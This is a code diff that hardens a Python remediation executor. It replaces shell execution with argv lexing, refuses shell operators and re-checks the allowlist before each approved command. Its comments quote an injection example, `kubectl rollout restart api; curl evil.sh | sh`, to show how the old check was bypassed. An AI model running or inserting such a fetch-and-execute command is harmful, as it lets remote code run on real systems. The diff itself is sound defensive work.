@@ -43,6 +43,7 @@ import asyncio
 import json
 import logging
 import re
+import shlex
 import time
 import uuid
 from pathlib import Path
@@ -178,8 +179,53 @@ def _write(path: Path, row: dict[str, Any]) -> None:
     atomic_write(path, (json.dumps(row, ensure_ascii=False, indent=2) + "\n").encode("utf-8"))
 
 
+# Tokens that only a shell can mean. A remediation command containing one of
+# these cannot be executed as an argv, and running it through a shell is what
+# made the allowlist unenforceable: `kubectl rollout restart .*` reads as "a
+# target name may vary" and actually permitted
+# `kubectl rollout restart api; curl evil.sh | sh`, because the wildcard span
+# was handed to /bin/sh. So a command that needs a shell is refused instead —
+# a deliberate narrowing, and the honest one: a pattern cannot bound what a
+# pipeline does.
+_SHELL_ONLY_TOKENS = frozenset({";", "|", "||", "&", "&&", ">", ">>", "<", "<<", "(", ")", "$"})
+_SHELL_ONLY_CHARS = ("`", "\n")
+
+
+def argv_for(command: str) -> tuple[list[str] | None, str]:
+    """The command as an argv, or None and the reason it cannot be one.
+
+    Lexed with punctuation_chars so every shell operator arrives as its own
+    token and can be refused by identity rather than by scanning for substrings
+    inside quoted text. That lexing also normalises the string-splitting trick
+    (`"de""lete"` becomes `delete`), so what the allowlist matched and what
+    would actually run cannot differ by quoting.
+    """
+    if any(char in command for char in _SHELL_ONLY_CHARS):
+        return None, "command substitution or a newline needs a shell, which is not available here"
+    lexer = shlex.shlex(command, posix=True, punctuation_chars=True)
+    lexer.whitespace_split = True
+    try:
+        tokens = list(lexer)
+    except ValueError as exc:
+        return None, f"command is not lexable ({exc})"
+    for token in tokens:
+        if token in _SHELL_ONLY_TOKENS:
+            return None, f"{token!r} needs a shell; an allowlist pattern cannot bound what follows it"
+    if not tokens:
+        return None, "empty command"
+    return tokens, ""
+
+
 def allowlist_patterns(path: Path | None) -> list[str]:
-    """Hot-read at execution time: editing the file needs no restart."""
+    """Read fresh on every call, so editing the file needs no restart.
+
+    Called at BOTH gates — once by approve() over the whole procedure, and again
+    by execute() immediately before each command. The second read is the one
+    that matters for a file an operator edits during an incident: tightening the
+    allowlist while a procedure is mid-flight now stops the remaining steps,
+    where before the whole sequence ran against whatever the file said at the
+    moment of the click.
+    """
     if path is None:
         return []
     try:
@@ -236,19 +282,51 @@ def reject(workdir: Path, proposal_id: str) -> dict[str, Any]:
     return row
 
 
-async def execute(workdir: Path, row: dict[str, Any], *, bash_timeout_ms: int) -> None:
+async def execute(workdir: Path, row: dict[str, Any], *, bash_timeout_ms: int, allowlist: Path | None = None) -> None:
     """Approved commands run EXACTLY as written: sequentially, stop on the
     first failure, output captured, every command on the audit log. No
     agent in this loop — an agent that adapts an approved command is
-    executing something nobody approved."""
+    executing something nobody approved.
+
+    NO SHELL. Each command is lexed into an argv and exec'd directly, so the
+    allowlist pattern that permitted it bounds what actually runs. Under a shell
+    it did not: any pattern with a wildcard handed that span to /bin/sh, and
+    `kubectl rollout restart .*` — written to let a target name vary — also
+    permitted `; curl evil.sh | sh`. A command that genuinely needs a shell is
+    refused with a reason rather than quietly widened.
+
+    The allowlist is re-checked HERE, per command, not only at the click. An
+    operator tightening the file during an incident should stop the steps that
+    have not run yet; approve-time-only meant the whole sequence ran against
+    whatever the file said when the button was pressed.
+    """
     timeout = max(30.0, (bash_timeout_ms or 120000) / 1000.0)
     failed = False
     for step in row.get("steps", []):
         command = str(step.get("command") or "")
         started = time.monotonic()
+        # Second gate. Deny-by-default holds: a file that has since been emptied
+        # or narrowed stops the rest of the procedure.
+        refusal = deny_reason(command, allowlist_patterns(allowlist))
+        if refusal is None:
+            argv, refusal = argv_for(command)
+        else:
+            argv = None
+        if argv is None:
+            row.setdefault("results", []).append(
+                {
+                    "command": command,
+                    "exit": -1,
+                    "ms": 0,
+                    "output": f"refused at execution: {refusal}",
+                }
+            )
+            logger.warning("remediation step refused at execution: %s — %s", command, refusal)
+            failed = True
+            break
         try:
-            process = await asyncio.create_subprocess_shell(  # noqa: S604 — operator-approved, allowlist-gated
-                command,
+            process = await asyncio.create_subprocess_exec(
+                *argv,
                 stdout=asyncio.subprocess.PIPE,
                 stderr=asyncio.subprocess.STDOUT,
                 cwd=str(workdir),
